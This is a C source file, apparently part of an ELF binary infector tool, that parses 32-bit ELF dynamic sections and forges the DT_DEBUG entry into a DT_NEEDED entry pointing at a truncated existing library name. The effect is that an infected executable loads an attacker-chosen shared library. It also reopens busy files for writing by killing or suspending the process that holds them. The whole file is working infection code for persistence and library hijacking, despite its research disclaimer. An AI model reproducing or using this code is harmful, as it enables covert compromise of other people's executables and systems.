/*
 * Copyright (C) 2025 ff794e44ea1c2b5211a3b07c57b5a3813f87f53ac10d78e56b16b79db6ff9615
 *                    b726ae7cf45cc4dfa8de359caffb893209bca614d9387a7666b106052fba3e50
 *
 * This program is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation, either version 3 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program. If not, see <https://www.gnu.org/licenses/>.
 *
 * DMCA Security Research Exemption:
 * Good faith security research performed consistent with 17 U.S.C. §1201(j) and
 * 37 CFR §201.40(b)(7) is explicitly permitted.
 *
 * This software is intended solely for educational, forensic, and lawful
 * security research purposes. Any use of this software for offensive or harmful
 * purposes is strictly prohibited.
 *
 * GENERAL DISCLAIMER:
 * This program is distributed WITHOUT ANY WARRANTY or guarantee of suitability.
 * The author explicitly disclaims responsibility and liability for any direct,
 * indirect, incidental, or consequential damages resulting from use or misuse.
 * Users accept all risks associated with use or distribution.
 *
 * Use, modification, or distribution constitutes explicit agreement to all terms
 * above.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <limits.h>
#include <elf.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include "debug.h"
#include "common.h"
#include "infector.h"

static inline unsigned int get_uint(elf_dtn_infector_state_t *ei, unsigned int val)
{
    return (ei->host_little == ei->file_little) ? val : swap32(val);
}

static inline unsigned int get_ushort(elf_dtn_infector_state_t *ei, unsigned int val)
{
    return (ei->host_little == ei->file_little) ? val : swap16(val);
}


/* Convert virtual address to file offset using PT_LOAD segments */
static unsigned int vaddr_to_offset(elf_dtn_infector_state_t *ei, unsigned int vaddr)
{
    Elf32_Phdr ph;
    int i;
    unsigned int phoff = get_uint(ei, ei->ehdr.e_phoff);
    unsigned short phnum = get_ushort(ei, ei->ehdr.e_phnum);

    for (i = 0; i < phnum; i++)
    {
        fseek(ei->f, phoff + i * sizeof(Elf32_Phdr), SEEK_SET);
        fread(&ph, 1, sizeof(Elf32_Phdr), ei->f);

        unsigned int p_type   = get_uint(ei, ph.p_type);
        unsigned int p_offset = get_uint(ei, ph.p_offset);
        unsigned int p_vaddr  = get_uint(ei, ph.p_vaddr);
        unsigned int p_filesz = get_uint(ei, ph.p_filesz);

        if (p_type == PT_LOAD && vaddr >= p_vaddr && vaddr < (p_vaddr + p_filesz))
        {
            debug_fprintf(stdout, "[*] vaddr_to_offset(%08x) = %08x...\n",
                vaddr, p_offset + (vaddr - p_vaddr));
            return p_offset + (vaddr - p_vaddr);
        }
    }

    debug_fprintf(stderr, "[!] vaddr_to_offset: failed\n");

    return 0;
}

/* Helper: Calculate slack space available after the DT_STRTAB region.
 * It scans the section headers to find the section with the smallest
 * sh_offset greater than strtab_offset and returns the difference between
 * that section's start and (strtab_offset + current_size).
 *
 * In practice this is rarely observed (the next section immediately follows) :-(
 *
 * Returns: available slack space in bytes, or UINT_MAX if no following section found.
 */
static unsigned int get_strtab_slack_space(elf_dtn_infector_state_t *ei)
{
    unsigned int shoff = get_uint(ei, ei->ehdr.e_shoff);
    unsigned short shnum = get_ushort(ei, ei->ehdr.e_shnum);
    unsigned short shentsize = get_ushort(ei, ei->ehdr.e_shentsize);

    unsigned int strtab_end = ei->strtab_offset + ei->strtab_size;
    unsigned int next_section_offset = UINT_MAX;
    Elf32_Shdr shdr;
    int i;

    for (i = 0; i < shnum; i++)
    {
         if (fseek(ei->f, shoff + i * shentsize, SEEK_SET) != 0) {
              continue;
         }

         if (fread(&shdr, 1, sizeof(Elf32_Shdr), ei->f) != sizeof(Elf32_Shdr)) {
              continue;
         }

         unsigned int sec_offset = get_uint(ei, shdr.sh_offset);

         if (sec_offset > ei->strtab_offset && sec_offset < next_section_offset) {
             next_section_offset = sec_offset;
         }
    }

    /*  no adjacent section found */
    if (next_section_offset == UINT_MAX)
         return UINT_MAX;

    return next_section_offset - strtab_end;
}

/* Update the DT_STRSZ dynamic entry to new_size */
int update_dt_strsz(elf_dtn_infector_state_t *ei, unsigned int new_size)
{
    Elf32_Dyn dyn;
    int i;
    int count = ei->dynamic_size / sizeof(Elf32_Dyn);

    for (i = 0; i < count; i++)
    {
        if (fseek(ei->f, ei->dynamic_offset + i * sizeof(Elf32_Dyn), SEEK_SET) != 0) {
            debug_fprintf(stderr, "fseek error in update_dt_strsz at index %d\n", i);
            return 0;
        }

        if (fread(&dyn, 1, sizeof(Elf32_Dyn), ei->f) != sizeof(Elf32_Dyn)) {
            debug_fprintf(stderr, "fread error in update_dt_strsz at index %d\n", i);
            return 0;
        }

        unsigned int tag = get_uint(ei, dyn.d_tag);

        if (tag == DT_STRSZ)
        {
            dyn.d_un.d_val = get_uint(ei, new_size);

            if (fseek(ei->f, ei->dynamic_offset + i * sizeof(Elf32_Dyn), SEEK_SET) != 0) {
                debug_fprintf(stderr, "fseek error while writing DT_STRSZ at index %d\n", i);
                return 0;
            }

            if (fwrite(&dyn, 1, sizeof(Elf32_Dyn), ei->f) != sizeof(Elf32_Dyn)) {
                debug_fprintf(stderr, "fwrite error while updating DT_STRSZ at index %d\n", i);
                return 0;
            }

            return 1;
        }
    }
    debug_fprintf(stderr, "DT_STRSZ entry not found in dynamic section.\n");
    return 0;
}

/* Update the section header's sh_size for the DT_STRTAB region */
int update_strtab_section_size(elf_dtn_infector_state_t *ei, unsigned int new_size)
{
    unsigned int shoff = get_uint(ei, ei->ehdr.e_shoff);
    unsigned short shnum = get_ushort(ei, ei->ehdr.e_shnum);
    unsigned short shentsize = get_ushort(ei, ei->ehdr.e_shentsize);

    Elf32_Shdr shdr;
    int found = 0;
    int i;

    for (i = 0; i < shnum; i++) {
         if (fseek(ei->f, shoff + i * shentsize, SEEK_SET) != 0) {
              debug_fprintf(stderr, "fseek error in section header update\n");
              return 0;
         }
         if (fread(&shdr, 1, sizeof(Elf32_Shdr), ei->f) != sizeof(Elf32_Shdr)) {
              debug_fprintf(stderr, "fread error in section header update\n");
              return 0;
         }
         unsigned int sh_offset = get_uint(ei, shdr.sh_offset);

         if (sh_offset == ei->strtab_offset)
         {
              unsigned int new_size_val = get_uint(ei, new_size);

              shdr.sh_size = new_size_val;

              if (fseek(ei->f, shoff + i * shentsize, SEEK_SET) != 0) {
                  debug_fprintf(stderr, "fseek error when writing section header\n");
                  return 0;
              }
              if (fwrite(&shdr, 1, sizeof(Elf32_Shdr), ei->f) != sizeof(Elf32_Shdr)) {
                  debug_fprintf(stderr, "fwrite error when updating section header\n");
                  return 0;
              }
              found = 1;
              break;
         }
    }
    if (!found) {
         debug_fprintf(stderr, "DT_STRTAB section header not found.\n");
         return 0;
    }
    return 1;
}

/* Function to search the DT_STRTAB for a given entry.
 * f: the opened file pointer.
 * strtab_offset: file offset where DT_STRTAB begins.
 * strtab_size: total size of the string table.
 * name: if non-NULL, the function searches for an entry matching this string.
 *
 * Returns: file offset of the matching string if found, or 0 otherwise.
 */
int get_strtab_entry_offset(elf_dtn_infector_state_t *ei, const char *name)
{
    unsigned int i;

    if (!ei->dt_needed_count)  {
        debug_fprintf(stderr, "dt_needed_count == 0!\n");
        return -1;
    }

    /* If no name is provided, simply return the base offset of the string table */
    if (name == NULL) {
        debug_fprintf(stdout, "no preferred DT_STRTAB entry given, defaulting to first\n");
        return ei->dt_needed[0].offset;
    }

    for (i = 0; i < ei->dt_needed_count; i++)
    {
        if (strcmp(ei->dt_needed[i].name, name) == 0) {
            return ei->dt_needed[i].offset;
        }
    }

    return 0;
}

static inline unsigned int valid_dt_needed_offset(elf_dtn_infector_state_t *ei,
    unsigned int off, unsigned int *out)
{
    unsigned int i;

    for (i = 0; i < MAX_DT_NEEDED; i++) {
        if (ei->dt_needed_offsets[i] == off) {
            if (out)
                *out = i;

            return 1;
        }
    }

    return 0;
}

static unsigned int populate_dt_needed_items(elf_dtn_infector_state_t *ei)
{
    unsigned int n = 0;

    if (!ei->strtab_size)  {
        debug_fprintf(stderr, "strtab_size == 0!\n");
        return -1;
    }

    char *strtab = malloc(ei->strtab_size);
    if (!strtab) {
        debug_perror("[!] populate_dt_needed_items:malloc");
        return 0;
    }

    memset(strtab, 0, ei->strtab_size);

    if (fseek(ei->f, ei->strtab_offset, SEEK_SET) != 0) {
        debug_perror("[!] populate_dt_needed_items:fseek");
        free(strtab);
        return 0;
    }

    if (fread(strtab, 1, ei->strtab_size, ei->f) != ei->strtab_size) {
        debug_perror("[!] populate_dt_needed_items:fread strtab_size");
        free(strtab);
        return 0;
    }

    unsigned int offset = 0;

    while (offset < ei->strtab_size)
    {
        char *curr = strtab + offset;
        size_t len = strlen(curr);

        if (len && n < MAX_DT_NEEDED)
        {
            if (valid_dt_needed_offset(ei, offset, NULL))
            {
                strncpy(ei->dt_needed[n].name, curr, sizeof(ei->dt_needed[n].name));
                ei->dt_needed[n].name[sizeof(ei->dt_needed[n].name) - 1] = '\0';
                ei->dt_needed[n].offset = offset;
                n++;

                debug_fprintf(stdout, "[*] DT_NEEDED: %s (offset %u)\n", curr, offset);
            }
        }

        if (offset > ei->dt_needed_max_str_offset)
            break;

        offset += len + 1;
    }

    free(strtab);

    return n;
}

int elf_dtn_infector_init(elf_dtn_infector_state_t *ei, const char *path)
{
    unsigned int i;
    Elf32_Phdr ph;

    memset(ei, 0, sizeof(elf_dtn_infector_state_t));

    ei->f = fopen(path, "rb");
    if (ei->f == NULL) {
        debug_perror("elf_dtn_infector_init:fopen");
        return INFECT_ERR_OPEN;
    }

    ei->debug_index = -1;
    ei->strtab_index = -1;
    ei->dt_needed_count = 0;

    /* read ELF header */
    fread(&ei->ehdr, 1, sizeof(Elf32_Ehdr), ei->f);

    /* determine endianness */
    ei->file_little = (ei->ehdr.e_ident[5] == 1);
    ei->host_little = is_host_little_endian();

    /* locate PT_DYNAMIC */
    ei->dynamic_offset = 0;
    ei->dynamic_size = 0;
    ei->phoff = get_uint(ei, ei->ehdr.e_phoff);
    ei->phnum = get_ushort(ei, ei->ehdr.e_phnum);

    for (i = 0; i < ei->phnum; i++) {
        fseek(ei->f, ei->phoff + i * sizeof(Elf32_Phdr), SEEK_SET);
        fread(&ph, 1, sizeof(Elf32_Phdr), ei->f);

        unsigned int p_type = get_uint(ei, ph.p_type);

        if (p_type == PT_DYNAMIC) {
            ei->dynamic_offset = get_uint(ei, ph.p_offset);
            ei->dynamic_size = get_uint(ei, ph.p_filesz);

            break;
        }
    }

    /* read dynamic section */
    fseek(ei->f, ei->dynamic_offset, SEEK_SET);

    for (i = 0; i < ei->dynamic_size / sizeof(Elf32_Dyn); i++)
    {
        fread(&ei->dyn, 1, sizeof(Elf32_Dyn), ei->f);

        unsigned int tag = get_uint(ei, ei->dyn.d_tag);
        unsigned int dval =  get_uint(ei, ei->dyn.d_un.d_val);

        if (tag == DT_DEBUG)
        {
            ei->debug_index = i;
        } else if (tag == DT_NEEDED)
        {
            if (!ei->dt_needed_offsets[ei->dt_needed_count])
                ei->dt_needed_offsets[ei->dt_needed_count] = dval;

            /* used for optimizing the DT_STRTAB parsing (to bail out as early as possible) */
            if (ei->dt_needed_max_str_offset < dval)
                ei->dt_needed_max_str_offset = dval;

            ei->dt_needed_count++;
        } else if (tag == DT_STRSZ) {
            ei->strtab_size = dval;
        } else if (tag == DT_STRTAB) {
            ei->strtab_vaddr = get_uint(ei, ei->dyn.d_un.d_ptr);
            ei->strtab_index = i;
        }
    }

    ei->strtab_offset = vaddr_to_offset(ei, ei->strtab_vaddr);

    populate_dt_needed_items(ei);

    if (ei->debug_index == -1) {
        debug_fprintf(stderr, "[!] DT_DEBUG not present!\n");
        return INFECT_ERR_NO_DTDEBUG;
    }

    debug_fprintf(stdout, "[*] DT_DEBUG at idx %d\n", ei->debug_index);
    debug_fprintf(stdout, "[*] DT_STRSZ size %u\n", ei->strtab_size);
    debug_fprintf(stdout, "[*] DT_STRTAB vaddr %08x (off %08x)\n",
        ei->strtab_vaddr, ei->strtab_offset);
    debug_fprintf(stdout, "[*] DT_STRTAB size %u\n", ei->strtab_size);

    return 0;
}

int elf_dtn_infector_forge_dtneeded(elf_dtn_infector_state_t *ei,
    const char *target,
    int mode,
    unsigned int skip,
    char *outname,
    size_t outlen)
{
    FILE *new_f;
    pid_t parent_pid = -1;

    if (ei == NULL)
        return -1;

    /* forge DT_DEBUG into DT_NEEDED */
    if (ei->debug_index != -1)
    {
        unsigned int target_idx;

        ei->strtab_offset = vaddr_to_offset(ei, ei->strtab_vaddr);

        /* assuming strtab_offset was obtained using vaddr_to_offset
         * and strtab_size from DT_STRSZ.
         */
        int entry_offset = get_strtab_entry_offset(ei, target);

        if (entry_offset != 0) {
            debug_fprintf(stdout, "[*] Found DT_STRTAB entry at offset 0x%x\n", entry_offset);
        } else {
            debug_fprintf(stdout, "[!] Entry not found in DT_STRTAB.\n");
            return INFECT_ERR_NOTFOUND;
        }

        /* valid DT_NEEDED string entries always begin at 1 */
        if (valid_dt_needed_offset(ei, entry_offset, &target_idx))
        {
            dt_needed_item_t *target = &ei->dt_needed[target_idx];
            size_t libname_len = strlen(target->name);
            size_t remainder = libname_len - skip;
            const char *forged_name;

            if (remainder < 1 || remainder > libname_len) {
                debug_fprintf(stdout, "[!] remainder=%u while DT_STRTAB entry len=%u\n",
                    remainder, libname_len);
                return -1;
            }

            forged_name = (char *) target->name + skip;

            debug_fprintf(stdout, "[*] forged DT_NEEDED will point at %s (orig %s from %u)\n",
                    forged_name, target->name, entry_offset);

            strncpy(outname, forged_name, outlen);
            outname[outlen - 1] = '\0';

            entry_offset += skip;
        }

        ei->dyn.d_tag = get_uint(ei, DT_NEEDED);
        ei->dyn.d_un.d_val = get_uint(ei, entry_offset);

        new_f = reopen_file_with_kill(ei->f, &parent_pid);
        if (new_f == NULL) {
            debug_fprintf(stdout, "[!] failed to reopen file for writing.\n");
            return INFECT_ERR_WRITE;
        }

        ei->f = new_f;

        fseek(ei->f, ei->dynamic_offset + ei->debug_index * sizeof(Elf32_Dyn), SEEK_SET);

#ifdef PERSISTENT_INFECTION
        fwrite(&ei->dyn, 1, sizeof(Elf32_Dyn), ei->f);
#endif

        debug_fprintf(stdout, "[+] success! forged DT_DEBUG at %08x -> DT_NEEDED at offset 0x%x\n",
            ei->dynamic_offset + ei->debug_index * sizeof(Elf32_Dyn),
            entry_offset);

        /* now that the write is done, resume the parent (if any) */
        if (parent_pid != -1) {
            debug_fprintf(stdout, "[*] resuming parent process %d\n", parent_pid);
            resume_process(parent_pid);
        }

        fclose(ei->f);

        return 0;
    } else {
        /* :-) */
        return INFECT_ERR_NO_DTDEBUG;
    }

    return -1;
}

#ifdef TEST_MAIN
/* TODO */
#endif
